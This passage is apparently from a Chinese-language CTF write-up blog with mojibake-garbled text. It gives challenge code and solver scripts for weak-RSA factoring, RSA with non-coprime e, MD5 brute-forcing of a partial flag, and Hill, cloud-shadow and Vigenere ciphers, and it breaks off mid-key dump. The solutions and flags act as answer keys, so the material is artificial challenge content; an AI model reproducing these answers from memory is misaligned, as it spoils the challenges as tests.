..!?! !.?.. ..... ...?. ?!.?! .?...</span><br><span class="line">..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! .....</span><br><span class="line">..!.. ..... ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?... .....</span><br><span class="line">..... ..... ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... .....</span><br><span class="line">..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... .!...</span><br><span class="line">....! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ...!. ?.... .....</span><br><span class="line">..!?! !.?.. ..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!!</span><br><span class="line">!!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ...!. !!!!! .?... ..... .....</span><br><span class="line">!?!!. ?.... ..... ...?. ?!.?. ..... ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... !.... ...!. ?.... ..... ....! ?!!.? ..... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?... ..... .....</span><br><span class="line">....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ...!.</span><br><span class="line">..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?..! .?... ..... ...!?</span><br><span class="line">!!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!! !!!!! !!!!!</span><br><span class="line">!!?.? !.?!! !!!!! !!!!. !.... ...!. ?.... ..... ..... .!?!! .?... .....</span><br><span class="line">..... .?.?! .?!.? .</span><br></pre></td></tr></table></figure>



<p>åˆ†æ</p>
<p>åªè¦ä¸‰ç§å…ƒç´   !?.  æ¯”è¾ƒç¬¦åˆOokåŠ å¯† </p>
<p><img src="/posts/555436f5/3.png"></p>
<p>å¥—å¨ƒé¢˜ æ²¡å•¥æ„æ€ ä¸æƒ³ç€äº†</p>
<h3 id="LitCTF-2023-yafu-ä¸­çº§"><a href="#LitCTF-2023-yafu-ä¸­çº§" class="headerlink" title="[LitCTF 2023]yafu (ä¸­çº§)"></a>[LitCTF 2023]yafu (ä¸­çº§)</h3><p>é¢˜ç›®</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n  = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    n *=getPrime(<span class="number">32</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 15241208217768849887180010139590210767831431018204645415681695749294131435566140166245881287131522331092026252879324931622292179726764214435307</span></span><br><span class="line"><span class="string">c = 12608550100856399369399391849907846147170257754920996952259023159548789970041433744454761458030776176806265496305629236559551086998780836655717</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>yafuåˆ†è§£n </p>
<p><img src="/posts/555436f5/4.png" alt="æˆªå›¾"></p>
<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">from Crypto.Util.number import *</span></span><br><span class="line"><span class="string">from secret import flag</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">m = bytes_to_long(flag)</span></span><br><span class="line"><span class="string">n  = 1</span></span><br><span class="line"><span class="string">for i in range(15):</span></span><br><span class="line"><span class="string">    n *=getPrime(32)</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = pow(m,e,n)</span></span><br><span class="line"><span class="string">print(f&#x27;n = &#123;n&#125;&#x27;)</span></span><br><span class="line"><span class="string">print(f&#x27;c = &#123;c&#125;&#x27;)</span></span><br><span class="line"><span class="string"># n = 15241208217768849887180010139590210767831431018204645415681695749294131435566140166245881287131522331092026252879324931622292179726764214435307</span></span><br><span class="line"><span class="string"># c = 12608550100856399369399391849907846147170257754920996952259023159548789970041433744454761458030776176806265496305629236559551086998780836655717</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">12608550100856399369399391849907846147170257754920996952259023159548789970041433744454761458030776176806265496305629236559551086998780836655717</span></span><br><span class="line">n = <span class="number">15241208217768849887180010139590210767831431018204645415681695749294131435566140166245881287131522331092026252879324931622292179726764214435307</span></span><br><span class="line"></span><br><span class="line">P1 = <span class="number">2201440207</span></span><br><span class="line">P2 = <span class="number">3354884521</span></span><br><span class="line">P3 = <span class="number">2719600579</span></span><br><span class="line">P4 = <span class="number">4171911923</span></span><br><span class="line">P5 = <span class="number">2906576131</span></span><br><span class="line">P6 = <span class="number">2767137487</span></span><br><span class="line">P7 = <span class="number">4021078331</span></span><br><span class="line">P8 = <span class="number">2585574697</span></span><br><span class="line">P9 = <span class="number">4044505687</span></span><br><span class="line">P10 = <span class="number">2151018733</span></span><br><span class="line">P11 = <span class="number">2315495107</span></span><br><span class="line">P12 = <span class="number">2758708999</span></span><br><span class="line">P13 = <span class="number">3355651511</span></span><br><span class="line">P14 = <span class="number">2923522073</span></span><br><span class="line">P15 = <span class="number">3989697563</span></span><br><span class="line"></span><br><span class="line">phi = (P1-<span class="number">1</span>)*(P2-<span class="number">1</span>)*(P3-<span class="number">1</span>)*(P4-<span class="number">1</span>)*(P5-<span class="number">1</span>)*(P6-<span class="number">1</span>)*(P7-<span class="number">1</span>)*(P8-<span class="number">1</span>)*(P9-<span class="number">1</span>)*(P10-<span class="number">1</span>)*(P11-<span class="number">1</span>)*(P12-<span class="number">1</span>)*(P13-<span class="number">1</span>)*(P14-<span class="number">1</span>)*(P15-<span class="number">1</span>)</span><br><span class="line">d  = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;LitCTF&#123;Mu1tiple_3m4ll_prim5_fac7ors_@re_uns4f5&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="LitCTF-2023-md5çš„ç ´è§£"><a href="#LitCTF-2023-md5çš„ç ´è§£" class="headerlink" title="[LitCTF 2023]md5çš„ç ´è§£"></a>[LitCTF 2023]md5çš„ç ´è§£</h3><p>é¢˜ç›®</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#flagå…¨æ˜¯ç”±å°å†™å­—æ¯åŠæ•°å­—ç»„æˆ</span></span><br><span class="line">m=md5(flag).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(flag[:<span class="number">13</span>]+flag[<span class="number">15</span>:<span class="number">18</span>]+flag[<span class="number">19</span>:<span class="number">34</span>]+flag[<span class="number">35</span>:<span class="number">38</span>])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment"># b&#x27;LitCTF&#123;md5can??3de?rypt213thoughcr?sh&#125;?</span></span><br><span class="line"><span class="comment"># 496603d6953a15846cd7cc476f146771</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;</span></span><br><span class="line">LitCTF&#123;md5can</span><br><span class="line">3de</span><br><span class="line">rypt213thoughc</span><br><span class="line">rsh&#125;<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>åˆ†æ</p>
<p>ç¼ºå°‘ç¬¬13ã€14ã€18ã€34ä½  çˆ†ç ´å¤§å°å†™å­—æ¯æ•°å­—å³å¯</p>
<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase,digits</span><br><span class="line"></span><br><span class="line"><span class="comment"># LitCTF&#123;md5can??3de?rypt213thoughcr?sh&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ascii_lowercase+digits:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> ascii_lowercase + digits:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> ascii_lowercase + digits:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> ascii_lowercase + digits:</span><br><span class="line">                f = <span class="string">&#x27;LitCTF&#123;md5can&#x27;</span>+i+j+<span class="string">&#x27;3de&#x27;</span>+k+<span class="string">&#x27;rypt213thoughcr&#x27;</span>+l+<span class="string">&#x27;sh&#125;&#x27;</span></span><br><span class="line">                h = md5(f.encode()).hexdigest()</span><br><span class="line">                <span class="comment"># print(h)</span></span><br><span class="line">                <span class="keyword">if</span> h == <span class="string">&#x27;496603d6953a15846cd7cc476f146771&#x27;</span>:</span><br><span class="line">                    <span class="built_in">print</span>(f)</span><br><span class="line">                    exit()</span><br><span class="line">                    </span><br><span class="line"><span class="comment"># LitCTF&#123;md5can123dexrypt213thoughcrpsh&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="HDCTF-2023-çˆ¬è¿‡å°å±±å»çœ‹äº‘"><a href="#HDCTF-2023-çˆ¬è¿‡å°å±±å»çœ‹äº‘" class="headerlink" title="[HDCTF 2023]çˆ¬è¿‡å°å±±å»çœ‹äº‘"></a>[HDCTF 2023]çˆ¬è¿‡å°å±±å»çœ‹äº‘</h3><p>é¢˜ç›®</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯†æ–‡ï¼šymyvzjtxswwktetpyvpfmvcdgywktetpyvpfuedfnzdjsiujvpwktetpyvnzdjpfkjssvacdgywktetpyvnzdjqtincduedfpfkjssne</span><br><span class="line">åœ¨å±±çš„é‚£å¤´ï¼Œæœ‰3ä¸ªäººï¼Œ4åªé¸Ÿï¼Œ19åªç¾Šï¼Œ11æœµäº‘</span><br></pre></td></tr></table></figure>

<p>æ²¡è§è¿‡ ä¸ä¼šæ•´ ç›´æ¥çœ‹ä¸‹wpè®°å½•ä¸‹</p>
<p>ã€å¸Œå°”+äº‘å½±ã€‘</p>
<h4 id="å¸Œå°”å¯†ç -hill-cipher"><a href="#å¸Œå°”å¯†ç -hill-cipher" class="headerlink" title="å¸Œå°”å¯†ç  hill cipher"></a>å¸Œå°”å¯†ç  hill cipher</h4><p>æ›¿æ¢å¯†ç ï¼Œä½¿ç”¨çŸ©é˜µå’ŒçŸ©é˜µä¹˜æ³•æ¥æ··åˆæ˜æ–‡</p>
<p><a href="http://www.metools.info/code/hillcipher243.html">http://www.metools.info/code/hillcipher243.html</a>  åœ¨çº¿è§£å¯† </p>
<p><img src="/posts/555436f5/5.png"></p>
<p>å¾—åˆ° yourpiniseightfourtwozeroeightfourtwoonezeroeighteightfourzerotwofourzeroeightfourzeroonezeroonetwofourx</p>
<p>å¯¹åº”æ•°å­—  eightfourtwozeroeightfourtwoonezeroeighteightfourzerotwofourzeroeightfourzeroonezeroonetwofour</p>
<p>842084210884024084010124      åªåŒ…å«01248äº‘å½±å¯†ç </p>
<p><img src="/posts/555436f5/6.png"></p>
<p>NOTFLAG</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># äº‘å½±å¯†ç åŠ è§£å¯†è„šæœ¬</span></span><br><span class="line"><span class="comment"># https://www.jianshu.com/p/b5aa5cf60f83</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de_code</span>(<span class="params">c</span>):</span><br><span class="line">    dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>), <span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>) + <span class="number">1</span>)]</span><br><span class="line">    flag = []</span><br><span class="line">    c2 = [i <span class="keyword">for</span> i <span class="keyword">in</span> c.split(<span class="string">&quot;0&quot;</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c2:</span><br><span class="line">        c3 = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            c3 += <span class="built_in">int</span>(j)</span><br><span class="line">        flag.append(dic[c3 - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">plaintext</span>):</span><br><span class="line">    dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>), <span class="built_in">ord</span>(<span class="string">&quot;Z&quot;</span>) + <span class="number">1</span>)]</span><br><span class="line">    m = [i <span class="keyword">for</span> i <span class="keyword">in</span> plaintext]</span><br><span class="line">    tmp = [];flag = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(m)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">            <span class="keyword">if</span> m[i] == dic[j]:</span><br><span class="line">                tmp.append(j + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">        res = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> i &gt;= <span class="number">8</span>:</span><br><span class="line">            res += <span class="built_in">int</span>(i/<span class="number">8</span>)*<span class="string">&quot;8&quot;</span></span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">8</span> &gt;=<span class="number">4</span>:</span><br><span class="line">            res += <span class="built_in">int</span>(i%<span class="number">8</span>/<span class="number">4</span>)*<span class="string">&quot;4&quot;</span></span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">4</span> &gt;=<span class="number">2</span>:</span><br><span class="line">            res += <span class="built_in">int</span>(i%<span class="number">4</span>/<span class="number">2</span>)*<span class="string">&quot;2&quot;</span></span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">2</span> &gt;= <span class="number">1</span>:</span><br><span class="line">            res += <span class="built_in">int</span>(i%<span class="number">2</span>/<span class="number">1</span>)*<span class="string">&quot;1&quot;</span></span><br><span class="line">        flag.append(res + <span class="string">&quot;0&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;&quot;</span>.join(flag)[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">c = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥è¦è§£å¯†çš„æ•°å­—ä¸²:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (de_code(c))</span><br><span class="line">m_code = <span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥è¦åŠ å¯†çš„æ•°å­—ä¸²:&quot;</span>)</span><br><span class="line">encode(m_code)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="LitCTF-2023-eçš„å­¦é—®ã€e-phiä¸äº’ç´ ã€‘"><a href="#LitCTF-2023-eçš„å­¦é—®ã€e-phiä¸äº’ç´ ã€‘" class="headerlink" title="[LitCTF 2023]eçš„å­¦é—®ã€e phiä¸äº’ç´ ã€‘"></a>[LitCTF 2023]eçš„å­¦é—®ã€e phiä¸äº’ç´ ã€‘</h3><p>é¢˜ç›®æè¿°:å½“eä¸æ˜¯65537äº†ï¼Œè¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">m=bytes_to_long(<span class="string">b&#x27;xxxxxx&#x27;</span>)</span><br><span class="line">p=getPrime(<span class="number">256</span>)</span><br><span class="line">q=getPrime(<span class="number">256</span>)</span><br><span class="line">e=<span class="number">74</span></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="comment">#p= 86053582917386343422567174764040471033234388106968488834872953625339458483149</span></span><br><span class="line"><span class="comment">#q= 72031998384560188060716696553519973198388628004850270102102972862328770104493</span></span><br><span class="line"><span class="comment">#c= 3939634105073614197573473825268995321781553470182462454724181094897309933627076266632153551522332244941496491385911139566998817961371516587764621395810123</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WP</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment"># e phiã€p-1 q-1ã€‘ å‡äº’ç´    å»å…¬çº¦æ•°</span></span><br><span class="line">e=<span class="number">74</span></span><br><span class="line">p= <span class="number">86053582917386343422567174764040471033234388106968488834872953625339458483149</span></span><br><span class="line">q= <span class="number">72031998384560188060716696553519973198388628004850270102102972862328770104493</span></span><br><span class="line">c= <span class="number">3939634105073614197573473825268995321781553470182462454724181094897309933627076266632153551522332244941496491385911139566998817961371516587764621395810123</span></span><br><span class="line">n= p*q</span><br><span class="line">phi_n = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">t = gmpy2.gcd(e,phi_n)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">e1 = e // t</span><br><span class="line">d= gmpy2.invert(e1,phi_n)</span><br><span class="line">m= <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="comment"># æ±‚çš„må å¯¹ m^tå¼€tæ¬¡æ–¹å³å¯</span></span><br><span class="line">msg = gmpy2.iroot(m,t)</span><br><span class="line"><span class="keyword">if</span> msg[<span class="number">1</span>]:</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(msg[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;LitCTF&#123;e_1s_n0t_@_Prime&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/555436f5/7.png"></p>
<p>é£äºŒè¥¿å·¥å…·ä¹Ÿå¯ç›´å‡ºm ç„¶ålongtobyteå³å¯å¾—åˆ°flag</p>
<h3 id="æ¹–æ¹˜æ¯-2021-signin-å¿˜åšäº†åé¢åš"><a href="#æ¹–æ¹˜æ¯-2021-signin-å¿˜åšäº†åé¢åš" class="headerlink" title="### [æ¹–æ¹˜æ¯ 2021]signin - å¿˜åšäº†åé¢åš"></a>### [æ¹–æ¹˜æ¯ 2021]signin - å¿˜åšäº†åé¢åš</h3><p>é¢˜ç›®</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>])</span><br><span class="line">m2 = bytes_to_long(flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">pbits, qbits</span>):</span><br><span class="line">    p1, q1 = getPrime(pbits), getPrime(qbits)</span><br><span class="line">    n1 = p1**<span class="number">4</span>*q1</span><br><span class="line">    q2 = getPrime(qbits)</span><br><span class="line">    bound = p1 // (<span class="number">8</span>*q1*q2) + <span class="number">1</span></span><br><span class="line">    p2 = random.randrange(p1, p1 + bound)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> isPrime(p2):</span><br><span class="line">        p2 = random.randrange(p1, p1 + bound)</span><br><span class="line">    n2 = p2**<span class="number">4</span>*q2</span><br><span class="line">    <span class="keyword">return</span> (n1, n2), (p1, q1), (p2, q2)</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">pbits = <span class="built_in">int</span>(<span class="number">360</span>)</span><br><span class="line">qbits = <span class="built_in">int</span>(<span class="number">128</span>)</span><br><span class="line">pk, sk1, sk2 = gen(pbits, qbits)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, pk[<span class="number">0</span>])</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, pk[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;pk = <span class="subst">&#123;pk&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1, c2 = <span class="subst">&#123;c1, c2&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pk = (1150398070565459492080597718626032792435556703413923483458704675295997646493249759818468321328556510074044954676615760446708253531839417036997811506222349194302791943489195718713797322878586379546657275419261647635859989280700191441312691274285176619391539387875252135478424580680264554294179123254566796890998243909286508189826458854346825493157697201495100628216832191035903848391447704849808577310612723700318670466035077202673373956324725108350230357879374234418393233, 1242678737076048096780023147702514112272319497423818488193557934695583793070332178723043194823444815153743889740338870676093799728875725651036060313223096288606947708155579060628807516053981975820338028456770109640111153719903207363617099371353910243497871090334898522942934052035102902892149792570965804205461900841595290667647854346905445201396273291648968142608158533514391348407631818144116768794595226974831093526512117505486679153727123796834305088741279455621586989)</span></span><br><span class="line"><span class="string">c1, c2 = (361624030197288323178211941746074961985876772079713896964822566468795093475887773853629454653096485450671233584616088768705417987527877166166213574572987732852155320225332020636386698169212072312758052524652761304795529199864805108000796457423822443871436659548626629448170698048984709740274043050729249408577243328282313593461300703078854044587993248807613713896590402657788194264718603549894361488507629356532718775278399264279359256975688280723740017979438505001819438, 33322989148902718763644384246610630825314206644879155585369541624158380990667828419255828083639294898100922608833810585530801931417726134558845725168047585271855248605561256531342703212030641555260907310067120102069499927711242804407691706542428236208695153618955781372741765233319988193384708525251620506966304554054884590718068210659709406626033891748214407992041364462525367373648910810036622684929049996166651416565651803952838857960054689875755131784246099270581394)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>





<h3 id="NSSCTF-2022-Spring-Recruit-Vigenere"><a href="#NSSCTF-2022-Spring-Recruit-Vigenere" class="headerlink" title="[NSSCTF 2022 Spring Recruit]Vigenere"></a>[NSSCTF 2022 Spring Recruit]Vigenere</h3><p>ä¸çŸ¥é“key  åˆ©ç”¨åœ¨çº¿ç½‘ç«™çˆ†ç ´  <a href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
<p>![image-20240221093344960](/Users/mamor/Library/Application Support/typora-user-images/image-20240221093344960.png)</p>
<h3 id="AFCTF-2018-å¯æ€œçš„RSA"><a href="#AFCTF-2018-å¯æ€œçš„RSA" class="headerlink" title="[AFCTF 2018]å¯æ€œçš„RSA"></a>[AFCTF 2018]å¯æ€œçš„RSA</h3><p>é¢˜ç›®ç»™äº†ä¸€ä¸ª flag.enc å’Œ public.key</p>
<p>openssl rsa -pubin -text -modulus -in warmup -in public.key &gt; 123.txt</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">Public-Key: (<span class="number">2070</span> bit)</span><br><span class="line">Modulus:</span><br><span class="line">    <span class="number">25</span>:b1:8b:f5:f3:<span class="number">89</span>:09:7d:<span class="number">17</span>:<span class="number">23</span>:<span class="number">78</span>:<span class="number">66</span>:bb:<span class="number">51</span>:cf:</span><br><span class="line">    f8:de:<span class="number">92</span>:<span class="number">24</span>:<span class="number">53</span>:<span class="number">74</span>:9e:bc:<span class="number">40</span>:3b:09:<span class="number">95</span>:c9:7c:0e:</span><br><span class="line">    <span class="number">38</span>:6d:<span class="number">46</span>:c1:<span class="number">61</span>:ca:df:f7:7c:<span class="number">69</span>:<span class="number">86</span>:0d:ae:<span class="number">47</span>:<span class="number">91</span>:</span><br><span class="line">    c2:<span class="number">14</span>:cf:<span class="number">84</span>:<span class="number">87</span>:aa:aa:9f:<span class="number">26</span>:e9:<span class="number">20</span>:a9:<span class="number">77</span>:<span class="number">83</span>:<span class="number">49</span>:</span><br><span class="line">    06:03:8a:ef:b5:c3:08:<span class="number">27</span>:df:cf:3f:c9:e9:<span class="number">76</span>:<span class="number">95</span>:</span><br><span class="line">    <span class="number">44</span>:f9:4e:07:cd:fe:08:<span class="number">72</span>:03:9a:3a:<span class="number">62</span>:<span class="number">62</span>:<span class="number">11</span>:<span class="number">66</span>:</span><br><span class="line">    <span class="number">78</span>:b2:<span class="number">61</span>:fb:2d:6b:9d:<span class="number">32</span>:<span class="number">53</span>:9e:<span class="number">92</span>:a1:<span class="number">53</span>:b3:<span class="number">67</span>:</span><br><span class="line">    <span class="number">56</span>:<span class="number">29</span>:ba:b3:<span class="number">94</span>:2e:7d:<span class="number">35</span>:e3:0f:7e:ef:5a:bf:1c:</span><br><span class="line">    <span class="number">50</span>:d7:<span class="number">97</span>:d0:cc:<span class="number">88</span>:e1:bd:cc:fd:1a:<span class="number">12</span>:ea:6f:7e:</span><br><span class="line">    f7:5c:<span class="number">37</span>:<span class="number">27</span>:db:df:2e:<span class="number">78</span>:0f:<span class="number">34</span>:<span class="number">28</span>:ae:8f:7a:4f:</span><br><span class="line">    b7:a8:9f:<span class="number">18</span>:4a:<span class="number">36</span>:<span class="number">50</span>:<span class="number">32</span>:b1:<span class="number">53</span>:f8:<span class="number">42</span>:5e:<span class="number">84</span>:<span class="number">57</span>:</span><br><span class="line">    <span class="number">50</span>:eb:2b:7a:bc:02:dc:<span class="number">15</span>:ce:02:07:<span class="number">50</span>:7a:a9:<span class="number">50</span>:</span><br><span class="line">    <span class="number">86</span>:3b:b8:<span class="number">48</span>:0a:<span class="number">78</span>:02:8d:d6:<span class="number">29</span>:<span class="number">79</span>:<span class="number">94</span>:4d:6c:<span class="number">63</span>:</span><br><span class="line">    3f:af:a1:03:e4:db:<span class="number">28</span>:ce:<span class="number">87</span>:f5:a0:c6:ed:4a:2f:</span><br><span class="line">    <span class="number">26</span>:<span class="number">64</span>:<span class="number">42</span>:7f:<span class="number">56</span>:5c:<span class="number">77</span>:<span class="number">81</span>:ab:<span class="number">61</span>:<span class="number">91</span>:<span class="number">45</span>:6d:<span class="number">97</span>:1c:</span><br><span class="line">    7f:fa:<span class="number">39</span>:<span class="number">52</span>:<span class="number">72</span>:<span class="number">37</span>:4c:ec:01:<span class="number">55</span>:e5:f9:<span class="number">11</span>:<span class="number">89</span>:db:</span><br><span class="line">    <span class="number">74</span>:2e:4c:<span class="number">28</span>:b0:3a:0f:a1:1c:ff:b0:<span class="number">31</span>:<span class="number">73</span>:d2:a4:</span><br><span class="line">    cc:e6:ae:<span class="number">53</span></span><br><span class="line">Exponent: <span class="number">65537</span> (<span class="number">0x10001</span>)</span><br><span class="line">Modulus=25B18BF5F389097D17237866BB51CFF8DE922453749EBC403B0995C97C0E386D46C161CADFF77C69860DAE4791C214CF8487AAAA9F26E920A977834906038AEFB5C30827DFCF3FC9E9769544F94E07CDFE0872039A3A6262116678B261FB2D6B9D32539E92A153B3675629BAB3942E7D35E30F7EEF5ABF1C50D797D0CC88E1BDCCFD1A12EA6F7EF75C3727DBDF2E780F3428AE8F7A4FB7A89F184A365032B153F8425E845750EB2B7ABC02DC15CE0207507AA950863BB8480A78028DD62979944D6C633FAFA103E4DB28CE87F5A0C6ED4A2F2664427F565C7781AB6191456D971C7FFA395272374CEC0155E5F91189DB742E4C28B03A0FA11CFFB03173D2A4CCE6AE53</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBJDANBgkqhkiG9w0BAQEFAAOCAREAMIIBDAKCAQMlsYv184kJfRcjeGa7Uc/<span class="number">4</span></span><br><span class="line">3pIkU3SevEA7CZXJfA44bUbBYcrf93xphg2uR5HCFM+Eh6qqnybpIKl3g0kGA4rv</span><br><span class="line">tcMIJ9/PP8npdpVE+U4Hzf4IcgOaOmJiEWZ4smH7LWudMlOekqFTs2dWKbqzlC59</span><br><span class="line">NeMPfu9avxxQ15fQzIjhvcz9GhLqb373XDcn298ueA80KK6Pek+3qJ8YSjZQMrFT</span><br><span 